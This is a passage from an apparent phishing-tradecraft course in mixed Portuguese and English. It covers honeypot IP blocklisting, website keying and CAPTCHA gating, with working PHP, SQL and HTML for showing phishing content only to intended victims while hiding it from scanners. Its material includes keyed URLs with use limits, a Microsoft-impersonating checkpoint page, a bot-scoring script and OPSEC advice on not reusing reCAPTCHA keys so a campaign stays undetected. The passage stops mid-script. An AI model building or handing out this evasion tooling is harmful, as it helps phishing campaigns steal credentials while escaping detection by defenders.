$encryptionKey = 'MaldevSecretKey321';

// Get the encrypted IP from the URL parameter
$encryptedIp = isset($_GET['encIp']) ? $_GET['encIp'] : '';

if (!empty($encryptedIp)) {

    $decryptedIp = decryptIpAddress($encryptedIp, $encryptionKey);

    // Append the decrypted IP to the blacklist file
    $file = '/var/www/ip_blacklist.txt';

    // Check if the IP is already in the file to avoid duplicates
    $currentContents = file_get_contents($file);
    if ($currentContents !== false && strpos($currentContents, $decryptedIp) === false) {
        file_put_contents($file, $decryptedIp . "\n", FILE_APPEND);
        http_response_code(200);
    } else {
        http_response_code(400); 
    }
} else {
    http_response_code(400);
}
?>

```
The video can be found in folder: `./videos/hidden-input-demo.mov`

## Conclusão
This module explored various strategies for integrating honeypots into the page to effectively identify and track both automated and manual attempts to analyze the phishing page in ways that legitimate users would not typically engage in.

"108111108"

## Objetivos
Create a hidden link that, when accessed, triggers an IP block for the user; then test the website with online scanning services

Develop two links: one hidden and one visible, and use online services to scan the website to see if there is a difference in how they are treated by scanners

Introduce an obfuscated JavaScript function that should not be used in normal operation. If this function is triggered, blacklist the IP address of the user


---

# Módulo 51 — Anti-Análise Via Website Keying

Módulo 51 — Anti-Analysis Via Website Keying

- # Módulo 51 — Anti-Análise Via Website Keying

# Disclaimer

## Introdução
Website keying is a technique that involves requiring a key to access a website or display phishing content. This approach ensures that only individuals with the key can view or access the designated content. For example, a keyed link that's sent to a target user may look as follows:
```
https://example.com/access/login.php?maldev=123456789

```
Where the value `123456789` is required to access the website and show the phishing content. Additionally, usage limitations can be placed on the key; once it exceeds a predefined number of uses, it becomes invalidated. And lastly, a validity period is set for the key, after which it expires and can no longer be used.This module will require MySQL to be setup as it will be used to store the keys and their properties, that is the number of uses left and their expiry date. Review the Database Setup - MySQL module for help in installing and configuring MySQL.
## Website Keying
As previously shown, keying is performed via query parameters where one or more parameters can be added to the phishing URL to allow the phishing website to be accessed. It's recommended that the query parameter key and value are generic and do not give an assumption that the user is being tracked or identified. Some examples that utilize generic query parameter values are shown below
```
https://example.com/access/login?theme=dark

https://example.com/access/login?styling=basic

https://example.com/access/login?color=red

https://example.com/access/login?option=0549560e-afbf-4408-9855-2829e1511ce6

// Combining two keys
https://example.com/access/login?theme=dark&styling=basic

```

## Metodologia
When someone tries to access the phishing website, the query parameters key and value will be extracted from the URL and checked against the database for the following:
Verify the validity of the key.

- Verify the validity of the value.

- Ensure that the entry has not expired.

- Confirm that the allowed number of uses for these values has not been exceeded. If so, reduce the count by 1.

If any of the above conditions are not met, the user will be shown a 404 Page Not Found error. On the other hand, if the conditions are met, the phishing page will be displayed.

## Setup do Banco e Tabela
Assuming that MySQL is installed and configured correctly, start by authenticating to MySQL.

```
# Authenticate to MySQL
mysql -u root -p

```
Next, create the `main` database and the `valid_keys` table with the provided columns. The table has a constraint that prevents multiple entries with the same key and value.

```
# Create the database & switch to it
CREATE DATABASE main;
USE main;

# Create the valid_keys table
CREATE TABLE valid_keys (
    id INT AUTO_INCREMENT PRIMARY KEY,
    key_name VARCHAR(255) NOT NULL,         # The query parameter key
    key_value VARCHAR(255) NOT NULL,        # The query parameter value
    uses_remaining INT DEFAULT NULL,        # Number of uses left for the key & value pair. NULL indicates unlimited uses.
    expiry_date DATETIME DEFAULT NULL,      # When the key expires. NULL indicates it doesn't expire
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    UNIQUE (key_name, key_value)            # The key & value pair must be unique
);

```

## Using A Single Key-Value Pair
With the database and table setup, keys can now be inserted into the table. We'll start by only keying the page with a single key, that is, only one key-value pair. The following MySQL statement will insert the key `theme` with a value of `dark`, allowing it to be used up to 10 times and setting it to expire 3 days from the current date.

```
INSERT INTO valid_keys (key_name, key_value, uses_remaining, expiry_date)
VALUES ('theme', 'dark', 5, NOW() + INTERVAL 3 DAY);

```

### Construindo Script PHP
The PHP script below follows a structured process to validate key-value pairs and manage their usage limits.

It begins by establishing a connection to the MySQL database. If more than one key-value pair is provided, the script returns a 404 response, as it is designed to handle only a single key-value pair at a time.

The script then extracts the key and its corresponding value from the request. It searches the `valid_keys` table to find a matching key-value pair while ensuring that `uses_remaining` is greater than zero and that the entry has not expired.

If a valid entry is found, `uses_remaining` is decremented, and the phishing content is displayed.

```
<?php
$servername = "localhost";
$username = "maldev";        // Replace this with your actual username
$password = "PASSWORD_HERE"; // Replace this with your actual password
$dbname = "main";

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

	// Ensure exactly one key/value pair is provided
    // This example will only work if a single key-value pair is provided
	if (count($_GET) !== 1) {
	    http_response_code(404);
	    exit('Page not found');
	}

    // Extract the key and value
    $key = key($_GET);
    $value = $_GET[$key];

    $sqlStatement = $conn->prepare("
        SELECT * 
        FROM valid_keys 
        WHERE key_name = :key 
        AND key_value = :value 
        AND (uses_remaining IS NULL OR uses_remaining > 0)
        AND (expiry_date IS NULL OR expiry_date > NOW())
    ");

    $sqlStatement->execute(['key' => $key, 'value' => $value]);
    $resultRow = $sqlStatement->fetch(PDO::FETCH_ASSOC);

    if (!$resultRow) {
	    http_response_code(404);
	    exit('Page not found');
    }

    // Make sure uses_remaining is not NULL and then decrement
	if ($resultRow['uses_remaining'] !== null) {
	    $updateStmt = $conn->prepare("
	        UPDATE valid_keys
	        SET uses_remaining = uses_remaining - 1
	        WHERE key_name = :key AND key_value = :value AND uses_remaining > 0
	    ");
	    
	    $updateStmt->execute(['key' => $key, 'value' => $value]);
	}

	echo "The key-value pair is valid."; // Phishing content would be placed here

} catch(PDOException $e) {
    http_response_code(500);
    echo "Connection failed: " . $e->getMessage();
}

$conn = null;
?>

```

### Single Key-Value Pair Demo
The video can be found in folder: `./videos/single-key-demo.mov`

## Using Multiple Key-Value Pairs
In this section, we'll create a PHP script that requires at least two valid key-value pairs to be used to access the page. This will require us to perform the same actions as before except now we must iterate through all provided key-value pairs to ensure they are valid.

Since this requires more than one valid key-value pair, insert another record into the `valid_keys` table:

```
INSERT INTO valid_keys (key_name, key_value, uses_remaining, expiry_date)
VALUES ('styling', 'basic', 5, NOW() + INTERVAL 3 DAY);

```

### Construindo Script PHP
This script is similar to the previous one but includes a few key differences.

First, the number of key-value pairs must be at least two for validation to proceed. Instead of checking a single key-value pair, the script now iterates over all submitted pairs, validating each one. This process ensures that both the key and value exist, that `uses_remaining` is greater than zero, and that the current date has not surpassed the `expiry_date`.

Finally, after validating the key-value pairs, the script iterates over all matching database entries and decrements `uses_remaining` by one for each valid combination.

```
<?php
$servername = "localhost";
$username = "maldev";        // Replace this with your actual username
$password = "PASSWORD_HERE"; // Replace this with your actual password
$dbname = "main";

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // We're expecting at least 2 valid pairs of key-values
    if (count($_GET) < 2) {
        http_response_code(404);
        exit('Page not found');
    }

    // This will store the valid key-value pairs
    // because we need to decrement the 'uses_remaining' for each one
    $validPairs = [];

    // Loop over all the key-value pairs and check their validity in the database
    foreach ($_GET as $key => $value) {
        $sqlStatement = $conn->prepare("
            SELECT * 
            FROM valid_keys 
            WHERE key_name = :key 
            AND key_value = :value 
            AND (uses_remaining IS NULL OR uses_remaining > 0)
            AND (expiry_date IS NULL OR expiry_date > NOW())
        ");
        $sqlStatement->execute(['key' => $key, 'value' => $value]);
        $resultRow = $sqlStatement->fetch(PDO::FETCH_ASSOC);
        if ($resultRow) {
            $validPairs[] = $resultRow;
        } else {
            http_response_code(404);
            exit('Page not found');
        }
    }

    // Decrement uses_remaining for each key-value pair
    foreach ($validPairs as $pair) {
        if ($pair['uses_remaining'] !== null) {  // Make sure that uses_remaining is not null
            $updateStmt = $conn->prepare("
                UPDATE valid_keys
                SET uses_remaining = uses_remaining - 1
                WHERE key_name = :key AND key_value = :value AND uses_remaining > 0
            ");
            $updateStmt->execute(['key' => $pair['key_name'], 'value' => $pair['key_value']]);
        }
    }

    echo "The key-value pairs are valid."; // Phishing content would be placed here

} catch(PDOException $e) {
    http_response_code(500);
    echo "Connection failed: " . $e->getMessage();
}

$conn = null;
?>

```

### Multiple Key-Value Pair Demo
The video can be found in folder: `./videos/multi-key-demo.mov`

## Specific Key-Value Pairs
The previous example allows any combination of valid key-value pairs to be used. This means if our `valid_keys` table had 10 valid key-value pairs, any combination of two or more of these keys will display the phishing content. Instead of doing this, we can require specific key-value pair combinations to display the phishing content. For example, we can mandate the requirement of either `css=true&styling=basic` or `theme=white&options=false` to display the phishing page. Mixing these options such as `css=true&theme=white` will return a 404 error.

We will use a `.json` file to store the valid pairs rather than a database. Create the file `valid_keys.json` in the `/var/www/` folder and paste the JSON content below.

```
[
    {
        "pairs": {
            "css": "true",
            "styling": "basic"
        },
        "uses_remaining": 5,
        "expiry_date": "2024-12-31"
    },
    {
        "pairs": {
            "theme": "white",
            "options": "false"
        },
        "uses_remaining": 5,
        "expiry_date": "2023-12-31"
    }
]

```
The `pairs` JSON key specifies which key-value pairs are required to access the phishing content. The `uses_remaining` and `expiry_date` behave the in the same manner as in previous examples.

### Construindo Script PHP
The script below follows a structured process to validate key-value pairs and manage their usage limits.

First, it reads the `valid_keys.json` file and decodes the JSON to retrieve the valid key-value pair combinations. It then retrieves all provided query parameters, which include the submitted key-value pairs.

Next, the script uses the helper function `isValidCombination` to verify whether the provided query parameters match a valid combination from the `valid_keys.json` file. This function also ensures that `uses_remaining` is greater than zero and that the expiry date has not passed. If a valid combination is found, the function returns its index key, allowing the script to decrement `uses_remaining`.

Once validated, the script decrements the `uses_remaining` count for the matched combination. It then deletes the existing `valid_keys.json` file and rewrites it with the updated version where `uses_remaining` has been reduced.

Finally, after updating the key data, the script proceeds to display the phishing content.

```
<?php
$PATH_TO_PAIRS = '/var/www/valid_keys.json';
$validPairs = json_decode(file_get_contents($PATH_TO_PAIRS), true);
$receivedPairs = $_GET; // Get all the provided key-value pairs
$currentDate = date('Y-m-d');

// Helper function
// Checks that the pairs are valid, the uses_remaining is greater than0 and the expiry date hasn't passed yet.
// Returns the key of the valid pair combo so that we can decrement the `uses_remaining` later
function isValidCombination($receivedPairs, $validPairs, $currentDate) {
    foreach ($validPairs as $key => $combination) {
        if (count(array_intersect_assoc($receivedPairs, $combination['pairs'])) == count($combination['pairs']) &&
            count($combination['pairs']) == count($receivedPairs)) {
            if ($combination['uses_remaining'] > 0 && $combination['expiry_date'] > $currentDate) {
                return $key;  // Return the key of the valid combination
            }
        }
    }
    return false;
}

$keyOfValidCombination = isValidCombination($receivedPairs, $validPairs, $currentDate);
if ($keyOfValidCombination === false) {
    http_response_code(404);
    exit('Page not found');
}

// Decrement uses_remaining using the key
$validPairs[$keyOfValidCombination]['uses_remaining']--;

// Delete the file and rewrite it
// Calling 'file_put_contents' without 'unlink' first can result in the file not being updated correctly
unlink($PATH_TO_PAIRS);
file_put_contents($PATH_TO_PAIRS, json_encode($validPairs));

echo "Phishing content";

?>

```

### Specific Key-Value Pairs Demo
The video can be found in folder: `./videos/specific-key-demo.mov`

## Caveats
A few important challenges must be considered when working with a `uses_remaining` value.

One issue is a race condition, which can occur when two users access the website simultaneously and attempt to use the same key-value pair while `uses_remaining` is greater than zero. If both users check the availability before either has a chance to decrement it, they may both believe a use is still available. As a result, they might each decrement `uses_remaining` from the same starting number, leading to an incorrect final count where the value is reduced by only one instead of two. In some cases, this could even result in a negative value. Race conditions can be mitigated using Database Transactions when working with MySQL or File Locking when dealing with files. The implementation of these solutions is left to the reader.

Another challenge comes from scanners. When a phishing link is sent to a user, automated scanning engines—such as email link scanners—are likely to access the URL before the intended target. This can result in `uses_remaining` being consumed by automated systems rather than real users. To account for this, it is important to carefully determine the initial `uses_remaining` value for each key-value pair, ensuring that legitimate users are not locked out due to premature depletion.

## Objetivos
Create two separate key-value pairs that can be used ten times

Create a keying method that utilizes the combination of three key-value pairs to show the phishing content


---

# Módulo 52 — Anti-Bot Via CAPTCHA

Módulo 52 — Anti-Bot Via CAPTCHA

- # Módulo 52 — Anti-Bot Via CAPTCHA

# Disclaimer

## Introdução
CAPTCHA, or Completely Automated Public Turing test to tell Computers and Humans Apart, is a method to distinguish between human users and automated bots by presenting tasks that are easy for humans to solve but difficult for machines. The image below from Boring Business Nerd shows a variety of different CAPTCHAs.Although many legitimate websites use CAPTCHAs to deter or prevent bots from accessing their websites, phishing campaigns utilizing CAPTCHAs have also seen a rise. Simply searching the term "CAPTCHA phishing" on a search engine such as Google will produce dozens of news and research articles showing and explaining CAPTCHA phishing.In this module, we'll walk through the implementation of CAPTCHA on our website, explain their advantages and disadvantages, and how they can be detected as "CAPTCHA phishing". This module will specifically utilize Google reCAPTCHA, however, the process is similar to other CAPTCHA providers such as hCaptcha.
## Generating reCAPTCHAv2 Keys
A prerequiste to using ReCAPTCHA is having a Google account. Assuming you've already created one and are logged in, proceed to the ReCAPTCHA Admin Console.A reCAPTCHA must be associated with a specific domain, which means it can only be used on the specified domain (e.g. example.com) or a subdomain (e.g. sub.example.com). Additionally, Google requires the selection of the reCAPTCHA type which will be a challenge reCAPTCHA (v2) and to provide a label associated with the website.Click "Submit" at the bottom of the page and Google will provide two keys: Site Key and Secret Key. The site key will be used in the frontend whereas the secret key will be used by the backend and should be kept private.
### Adding reCAPTCHA To Website
Adding reCAPTCHA to a website is a straightforward process. First, include the reCAPTCHA script by adding the following line to the `<head>` section of the website:`<script src="https://www.google.com/recaptcha/api.js" async defer></script>`.Next, create a `<div>` element with the attributes `class="g-recaptcha"` and `data-sitekey="SITE_KEY"`, replacing `SITE_KEY` with the site key provided by Google in the previous step.
```
<!DOCTYPE html>
<head>
    <title>reCAPTCHAv2</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
    <div class="g-recaptcha" data-sitekey="SITE_KEY"></div>
</body>
</html>

```
Browsing to the website should show the reCAPTCHA box. Note that currently, this reCAPTCHA has no associated functionality, so completing it will not trigger any actions.
### Adding Functionality - Callback Function
Adding functionality requires another attribute to be added to the reCAPTCHA `<div>` element. Adding the `data-callback` attribute and specifying a function name will cause the function to execute upon the user successfully completing the CAPTCHA.The code below will execute the `onSuccess` function upon the successful completion of the CAPTCHA. Furthermore, the `onSuccess` function will display an alert box stating that the CAPTCHA was completed.
```
<!DOCTYPE html>
<head>
    <title>reCAPTCHAv2</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
    <div class="g-recaptcha" data-sitekey="SITE_KEY" data-callback="onSuccess"></div>
<script>
    function onSuccess() {
        alert("The CAPTCHA was completed.");
    }
</script>
</body>
</html>

```
So far, we've only verified the CAPTCHA on the frontend, but we need to send the CAPTCHA response to the backend for analysis by Google's verification servers to ensure its authenticity.The frontend code will be changed to add the CAPTCHA inside a `<form>` that sends a POST request to `verify-captcha.php`. Additionally, the `onSuccess` function is modified to submit the form automatically upon successful completion.
```
<!DOCTYPE html>
<head>
    <title>reCAPTCHAv2</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
    <form id="form" action="verify-captcha.php" method="POST">
        <div class="g-recaptcha" data-sitekey="SITE_KEY" data-callback="onSuccess"></div>
    </form>

    <script>
        function onSuccess() {
            document.getElementById('form').submit();
        }
    </script>
</body>
</html>

```
The backend script will check for a POST request that provides the `g-recaptcha-response`, which is the reCAPTCHA's user validation token, sent from the client side after a user completes the CAPTCHA challenge. The script will then send a POST request to `https://www.google.com/recaptcha/api/siteverify` with the CAPTCHA's response, the secret key, and optionally the user's IP address. If Google returns a `success: true` response, we redirect the user to the phishing website.
Note: The PHP script below uses `curl` to send the `POST` request to Google. This requires the installation of `php-curl` using `sudo apt-get install php-curl`.

```
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['g-recaptcha-response'])) {
    $SECRET_KEY = 'SECRET_KEY'; // Add your secret key here from step 1
    $GOOGLE_URL = "https://www.google.com/recaptcha/api/siteverify";
    $response = $_POST['g-recaptcha-response'];
    // $remoteip = $_SERVER['REMOTE_ADDR']; // Optional

    $data = http_build_query([
        'secret' => $SECRET_KEY,
        'response' => $response,
        // 'remoteip' => $remoteip // Optional
    ]);

    // Sending a POST request to Google
    $curlReq = curl_init($GOOGLE_URL);
    curl_setopt($curlReq, CURLOPT_POST, true);
    curl_setopt($curlReq, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curlReq, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curlReq);
    $resultJson = json_decode($result);
    curl_close($curlReq);
    

    if ($resultJson && $resultJson->success) {
        header('Location: http://example.com'); // This will redirect to your phishing website
        exit;
    } else {
        // If reCAPTCHA verification fails, redirect to error.php
        header('Location: /error.php');
        exit;
    }
} else {
    // If reCAPTCHA verification fails, redirect to error.php
    header('Location: /error.php');
    exit;
}
?>

```
The video can be found in folder: `./videos/recaptcha-demo.mov`
### OPSEC Consideration
One method for detecting a phishing campaign involves analyzing the reCAPTCHA site key, which is exposed to the frontend. If the same site key has been used in previous malicious websites, it can be a strong indicator of a phishing attempt. This approach was discussed in this article by the Unit42 team, where they examined site keys to correlate different phishing campaigns.Such CAPTCHA keys are a strong signal for detecting malicious pages even without getting phishing content. Moreover, malicious CAPTCHA keys can be mined automatically using similar ground truth data and filtering pipelines...To mitigate this risk, it is recommended to always use a unique set of reCAPTCHA keys for each campaign and avoid reusing keys across multiple campaigns as it may inadvertently burn the campaign before even starting.
## Building Custom Captcha
Instead of relying on third-party providers for CAPTCHA solutions, we can develop our own custom CAPTCHA system. The complexity of our CAPTCHA can range from a simple question to a more intricate puzzle, such as matching images or solving logic problems. For our purposes, the CAPTCHA challenge will remain relatively simple. Later, it will be explained why increasing complexity doesn't necessarily stop automated systems from accessing the website.
### Designing CAPTCHA Page - Iteration 1
The initial step in developing a CAPTCHA system is to create the design for the page where the user's assessment will occur. The HTML template provided below serves as a checkpoint page, featuring the Microsoft logo and the `Microsoft.com` domain name. It informs the user that their activity is under assessment and includes a spinner that rotates continuously. This template is structured as if it were from Microsoft, suggesting that the challenge is being presented by Microsoft or aiming to give that impression to the user.
```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: white;
        color: black;
        margin: 0;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
    }
    .container {
        text-align: center;
        border: 1px solid #ccc;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h1 {
        margin: 0;
        font-size: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .icon {
        height: 30px;
        margin-right: 10px;
    }
    .captcha {
        margin: 20px 0;
        position: relative;
        height: 50px;
    }
    .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-radius: 50%;
        border-top: 4px solid #333;
        width: 36px;
        height: 36px;
        animation: spin 2s linear infinite;
        position: absolute;
        top: 50%;
        left: 50%;
        margin: -18px 0 0 -18px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .privacy {
        font-size: 14px;
        color: #777;
    }
</style>
<script>
</script>
</head>
<body>
<div class="container">
    <!-- Avoid linking external logos like this -->
    <!-- Download the logo and link it -->
    <h1><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/2048px-Microsoft_logo.svg.png" alt="Icon" class="icon">Microsoft.com</h1>
    <p>Checking if the site connection is secure</p>
    <div class="captcha">
        <div class="spinner" id="spinner"></div>
    </div>
    <p>Microsoft needs to review the security of your connection before proceeding.</p>
    <p class="privacy">Why am I seeing this?</p>
</div>
</body>
</html>

```
This design has a serious flaw: some scanners may not need to pass the challenge in order to know the page is malicious. The clear attempt at impersonating of Microsoft is sufficient to determine that the content placed beyond the CAPTCHA challenge is malicious. Therefore, it's important to keep the checkpoint page as neutral as possible to ensure an automated system cannot know the true intent of the page until the CAPTCHA is solved. This will be updated in the next iteration.
### Designing CAPTCHA Page - Iteration 2
This design iteration has been updated to be more neutral, leaving the intent of the website to be unknown until the CAPTCHA challenge is solved.
```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: white;
        color: black;
        margin: 0;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
    }
    .container {
        text-align: center;
        border: 1px solid #ccc;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h1 {
        margin: 0;
        font-size: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .icon {
        height: 30px;
        margin-right: 10px;
    }
    .browser-check {
        margin: 20px 0;
        position: relative;
        height: 50px;
    }
    .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-radius: 50%;
        border-top: 4px solid #333;
        width: 36px;
        height: 36px;
        animation: spin 2s linear infinite;
        position: absolute;
        top: 50%;
        left: 50%;
        margin: -18px 0 0 -18px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .privacy {
        font-size: 14px;
        color: #777;
    }
</style>
<script>
</script>
</head>
<body>
<div class="container">
    <h1>Checking your browser</h1>
    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <div class="browser-check">
        <div class="spinner" id="spinner"></div>
    </div>
</div>
</body>
</html>

```

### Invisible CAPTCHA
Modern CAPTCHA providers are increasingly adopting invisible CAPTCHA systems, which assess users without requiring them to solve visible challenges. Instead, these systems evaluate the user's network connection and behavior—such as mouse movements, keystroke dynamics, and interaction speed—using JavaScript to calculate a score that distinguishes between humans and bots. Additionally, necessary data should be collected from the frontend and transmitted to the backend for processing. Calculations should never occur on the frontend, as this would expose the CAPTCHA's logic, potentially allowing it to be manipulated to consistently mimic human behavior.In our system, we use a straightforward scoring mechanism that assigns each user a score between 0 and 1, where a score of 0 indicates the user is a human and a score of 1 suggests they are a bot. The acceptable threshold is set at 0.75; scores at or above this mark identify the user as likely a bot. The criteria for scoring are detailed as follows:
IP Address Analysis - We check the geographical origin of the IP address. If it originates from a data center, hosting provider, or VPN, this will increase the bot score.

- User Agent Analysis - The user agent string provided is run by our whitelisted user agents. In this example, we will only whitelist Chrome or Microsoft Edge, any other user agent will increase the bot score.

- Navigator Properties Analysis - We analyze some properties within the browser's navigator object, specifically, the `navigator.webdriver`, `navigator.cookieEnable`, and `navigator.hardwareConcurrency`.

#### IP Address Analysis
First, create the function `analyzeIpAddress`, which takes an IP address as a parameter. This function queries `IPInfo.io` to gather information. If the IP address belongs to a hosting provider, increase the bot score by 0.25. If the IP address belongs to a VPN, increase the bot score by 0.10.

```
function analyzeIpAddress($ipAddress) {
    global $botScore; // Access the $botScore global variable
    $scoreAdjustment = 0;

    $apiToken = '123456789';
    $apiUrl = "https://ipinfo.io/{$ipAddress}?token={$apiToken}";
    $response = file_get_contents($apiUrl);
    $locationData = json_decode($response, true);

    if (isset($locationData['privacy']) && $locationData['privacy']['hosting']) {
        $scoreAdjustment = 0.25;
    }

    else if (isset($locationData['privacy']) && $locationData['privacy']['vpn']) {
        $scoreAdjustment = 0.10; // Keep in mind it may be a corporate VPN
    }

    $botScore += $scoreAdjustment;
}

```

#### User Agent Analysis
Next, create the function `analyzeUserAgent`, which takes the user agent as a parameter. The function checks whether the user agent is Chrome or MS Edge. If it is not, increase the bot score by 0.50.

```
function analyzeUserAgent($userAgent) {
    global $botScore;
    $scoreAdjustment = 0;

    // Based off hypothetical intel, we know our target users only use Chrome or MS Edge
    // Only whitelisting these two keywords
    $whitelistedKeywords = array('Chrome', 'Edg');
    $isWhitelisted = false;

    foreach ($whitelistedKeywords as $keyword) {
        if (strpos($userAgent, $keyword) !== false) {
            $isWhitelisted = true;
            break;
        }
    }

    if (!$isWhitelisted) {
        $scoreAdjustment = 0.50;
    }

    $botScore += $scoreAdjustment;
}

```

#### Navigator Properties Analysis
The last function to create is `analyzeNavigatorProperties`, which takes three parameters:

- `$navigatorWebDriver` - The `navigator.webdriver` boolean value indicates whether automation is being used.

- `$navigatorCookieEnabled` - The `navigator.cookieEnabled` boolean value indicates whether cookies are enabled.

- `$navigatorHwConcurrency` - The `navigator.hardwareConcurrency` integer value indicates the number of logical processor cores. We have not discussed this property before, but it can be useful for detecting virtualized environments if the value is too low or high.

If `navigator.webdriver` is true, increase the bot score by 1. If `navigator.cookieEnabled` is false, increase the score by 0.25. Lastly, if `navigator.hardwareConcurrency` is 2 or less, increase the score by 0.10.

```
function analyzeNavigatorProperties($navigatorWebDriver, $navigatorCookieEnabled, $navigatorHwConcurrency) {
    global $botScore;
    $scoreAdjustment = 0;

    if ($navigatorWebDriver) {
        $scoreAdjustment += 1;
    }

    if (!$navigatorCookieEnabled) {
        $scoreAdjustment += 0.25;
    }

    // False positives can occur, so lowering the adjustment score
    if ($navigatorHwConcurrency <= 2) {
        $scoreAdjustment += 0.10;
    }

    $botScore += $scoreAdjustment;
}

```

#### Complete Code
The complete PHP script is shown below which extracts all the required data and passes it to the appropriate function.

```
<?php

// Global bot score variable
// We start the bot score at 0
// Meaning, we assume everyone is a human by default
// We can increase this (e.g. 0.25, 0.50 etc.) but we may block users more often
$botScore = 0;

function analyzeIpAddress($ipAddress) {
    global $botScore; // Access the global variable
    $scoreAdjustment = 0;

    $apiToken = '123456789';
    $apiUrl = "https://ipinfo.io/{$ipAddress}?token={$apiToken}";
    $response = file_get_contents($apiUrl);
    $locationData = json_decode($response, true);

    if (isset($locationData['privacy']) && $locationData['privacy']['hosting']) {
        $scoreAdjustment = 0.25;
    }

    else if (isset($locationData['privacy']) && $locationData['privacy']['vpn']) {
        $scoreAdjustment = 0.10; // Reduce score adjusted because it may be a corporate VPN
    }

    $botScore += $scoreAdjustment;
}

function analyzeUserAgent($userAgent) {
    global $botScore;
    $scoreAdjustment = 0;

    // Based off hypothetical intel, we know our target users only use Chrome or MS Edge
    // Only whitelisting these two keywords
    $whitelistedKeywords = array('Chrome', 'Edg');
    $isWhitelisted = false;

    foreach ($whitelistedKeywords as $keyword) {
        if (strpos($userAgent, $keyword) !== false) {
            $isWhitelisted = true;
            break;
        }
    }

    if (!$isWhitelisted) {
        $scoreAdjustment = 0.50;
    }

    $botScore += $scoreAdjustment;
}

function analyzeNavigatorProperties($navigatorWebDriver, $navigatorCookieEnabled, $navigatorHwConcurrency) {
    global $botScore;
    $scoreAdjustment = 0;

    if ($navigatorWebDriver) {
        $scoreAdjustment += 1;
    }

    if (!$navigatorCookieEnabled) {
        $scoreAdjustment += 0.25;
    }

    // False positives can occur, so lowering the adjustment score
    if ($navigatorHwConcurrency <= 2) {
        $scoreAdjustment += 0.10;
    }

    $botScore += $scoreAdjustment;
}

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ipAddress = $_SERVER['REMOTE_ADDR'];

// These 3 values will need to be sent to us from the frontend
$navigatorWebDriver = filter_var($_POST['webdriver'], FILTER_VALIDATE_BOOLEAN);
$navigatorCookieEnabled = filter_var($_POST['cookieEnabled'], FILTER_VALIDATE_BOOLEAN);
$navigatorHwConcurrency = intval($_POST['hardwareConcurrency']);

// Analyzing the user
analyzeIpAddress($ipAddress);
analyzeUserAgent($userAgent);
analyzeNavigatorProperties($navigatorWebDriver, $navigatorCookieEnabled, $navigatorHwConcurrency);

// If the bot score is greater than 1, default it to 1 since that's our upper limit.
if($botScore > 1){
    $botScore = 1;
}

// Decision based on bot score
// Uncomment this to take action based off the score
/*
if ($botScore >= 0.75) {
    // Redirect to a benign website
    header('Location: https://google.com');
    exit;
} else {
    // Redirect to phishing content
    header('Location: /phishing.php');
    exit;
}
*/

// Return the bot score
header('Content-Type: application/json');
echo json_encode(['botScore' => $botScore]);

?>

```
Additionally, we update the HTML template to now include a `<script>` that transmits the required navigator properties to our backend PHP script and then prints out the bot score to the console.

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: white;
        color: black;
        margin: 0;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
    }
    .container {
        text-align: center;
        border: 1px solid #ccc;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h1 {
        margin: 0;
        font-size: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .icon {
        height: 30px;
        margin-right: 10px;
    }
    .browser-check {
        margin: 20px 0;
        position: relative;
        height: 50px;
    }
    .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-radius: 50%;
        border-top: 4px solid #333;
        width: 36px;
        height: 36px;
        animation: spin 2s linear infinite;
        position: absolute;
        top: 50%;
        left: 50%;
        margin: -18px 0 0 -18px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .privacy {
        font-size: 14px;
        color: #777;
    }
</style>
<script>
</script>
</head>
<body>
<div class="container">
    <h1>Checking your browser</h1>
    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <div class="browser-check">
        <div class="spinner" id="spinner"></div>
    </div>
</div>
<script>
    const navigatorData = {
    webdriver: navigator.webdriver,
    cookieEnabled: navigator.cookieEnabled,
    hardwareConcurrency: navigator.hardwareConcurrency
    };

    fetch('captcha.php', {
        method: 'POST',
        headers: {
